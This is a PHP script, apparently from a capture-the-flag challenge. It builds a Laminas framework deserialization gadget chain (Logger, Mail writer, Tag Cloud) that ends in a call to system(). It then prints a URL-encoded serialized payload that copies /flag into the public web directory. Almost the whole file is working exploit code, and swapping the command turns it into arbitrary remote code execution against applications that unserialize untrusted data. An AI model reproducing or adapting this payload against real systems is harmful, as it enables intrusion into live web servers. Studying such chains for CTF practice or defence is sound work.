<?php
namespace Laminas\Log    {
    class Logger {
        protected $writers;

        function __construct($function, $param) {
            $this->writers = array(
                new \Laminas\Log\Writer\Mail($function, $param) //shutdown
            );
        }
    }
}
namespace Laminas\Log\Writer {
    class Mail {
        protected $eventsToMail;
        protected $subjectPrependText;
        protected $numEntriesPerPriority;

        function __construct($function, $param) {
            $this->eventsToMail = array(0);
            $this->subjectPrependText = "";
            $this->numEntriesPerPriority = array(
                0 => new \Laminas\Tag\Cloud($function, $param) //__toString
            );
        }
    }
}



namespace {
    $function = "system";
    $parameter = "cp /flag /var/www/html/public/flag.txt";

    $t =  new \Laminas\Log\Logger($function, $parameter);

    echo urlencode(serialize($t));

    echo "may_be_this_can_help_you";
}
